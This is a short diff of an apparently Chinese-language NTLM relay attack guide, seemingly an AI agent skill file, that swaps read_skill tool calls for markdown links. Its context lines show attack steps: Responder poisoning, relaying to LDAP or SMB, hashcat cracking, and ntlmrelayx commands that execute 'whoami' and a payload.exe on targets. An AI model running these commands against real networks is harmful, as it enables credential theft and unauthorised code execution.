@@ -12,7 +12,7 @@ NTLM Relay 是域渗透最强大的横向移动技术之一——不需要破解
 
 ## ⛔ 深入参考（必读）
 
-- ⛔**必读** 中继攻击详细配置和各种中继目标 → `read_skill(id="ntlm-relay-attack", path="references/relay-techniques.md")`
+- 中继攻击详细配置和各种中继目标 → [references/relay-techniques.md](references/relay-techniques.md)
 
 ---
 
@@ -59,7 +59,7 @@ curl -sk https://CA_SERVER/certsrv/
 │   ├─ 中继到 LDAP → RBCD / Shadow Credentials
 │   └─ 中继到 SMB → 命令执行
 └─ 拿到 NetNTLM Hash 但无法中继 → hashcat 离线破解
-详细命令 → `read_skill(id="ntlm-relay-attack", path="references/relay-techniques.md")`
+详细命令 → [references/relay-techniques.md](references/relay-techniques.md)
 ```
 
 ## Phase 3: Responder 毒化
@@ -120,7 +120,7 @@ ntlmrelayx.py -tf relay_targets.txt -smb2support -c "whoami"
 ntlmrelayx.py -tf relay_targets.txt -smb2support -e payload.exe
 ```
 
-→ 完整中继技术细节 → `read_skill(id="ntlm-relay-attack", path="references/relay-techniques.md")`
+→ 完整中继技术细节 → [references/relay-techniques.md](references/relay-techniques.md)
 
 ## 工具速查
 | 工具 | 用途 |
